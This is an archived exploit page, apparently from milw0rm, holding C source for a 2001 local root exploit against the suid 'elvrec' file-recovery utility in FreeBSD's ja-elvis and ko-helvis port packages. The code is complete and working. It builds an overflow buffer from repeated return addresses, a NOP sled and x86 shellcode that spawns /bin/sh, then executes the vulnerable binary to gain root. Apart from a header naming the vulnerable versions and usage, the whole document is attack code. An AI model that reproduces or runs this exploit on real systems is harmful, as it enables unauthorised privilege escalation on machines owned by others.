<html><head><title>FreeBSD 3.5.1/4.2 Ports Package Local Root Exploit
</title></head><pre>/*
 * ja-elvis &amp; ko-helvis - FreeBSD 3.5.1 &amp; 4.2 ports package local root exploit
 *
 * vulnerable: versions prior to ja-elvis-1.8.4_1 and ko-helvis-1.8h2_1
 * 
 * The above two packages contain a file recovery utility 'elvrec', installed
 * suid root(4755) by default. The utility is subject to a buffer overflow 
 * leading to root privileges:
 *
 * Usage: ./elvwreck &lt;offset&gt; &lt;alignment&gt;
 * 
 * dethy@synnergy.net // www.synnergy.net
 * 28 Feb 2001.
 *
 */ 

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#define PROG	&quot;/usr/local/bin/elvrec&quot;
#define VULN	608
#define BSIZE	1024
#define NOP	0x90
#define ESP	0xbfbff92c	// FreeBSD 4.2
#define OFFSET	0
#define EATME	1		// byte alignment

char shellcode[]= 
  &quot;\xeb\x37\x5e\x31\xc0\x88\x46\xfa\x89\x46\xf5\x89\x36\x89\x76&quot;
  &quot;\x04\x89\x76\x08\x83\x06\x10\x83\x46\x04\x18\x83\x46\x08\x1b&quot;
  &quot;\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x1d\x50\x56\xff&quot;
  &quot;\x36\xb0\x3b\x50\x90\x9a\x01\x01\x01\x01\x07\x07\xe8\xc4\xff&quot;
  &quot;\xff\xff\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02&quot;
  &quot;\x02\x02\x02/bin/sh.-c.sh&quot;;

int main(int argc, char *argv[]) {
  char buffer[BSIZE];
  long address=ESP;
  int i, offset, align;

  if(argc &gt; 1) { offset = atoi(argv[1]); align = atoi(argv[2]); } 
  else { offset = OFFSET; align = EATME; }

  address += offset;
  fprintf(stderr, &quot;\n* using ret %#x -&gt; align %d -&gt; offset %d\n\n&quot;, address, align, offset); 

  for(i=align; i&lt;VULN; i+=4){ *(long *)&amp;buffer[i] = address; }
  for(i=VULN; i&lt;(BSIZE - strlen(shellcode) - 100); i++){ buffer[i] = NOP; }
  memcpy(buffer+i, shellcode, strlen(shellcode));
  buffer[BSIZE] = '\0';

  if(execlp(PROG, &quot;elvrec&quot;, buffer, 0)) {
    fprintf(stderr, &quot;Unable to execute %s\n\n&quot;, PROG);
    exit(1);
  }
}


// milw0rm.com [2001-03-03]</pre></html>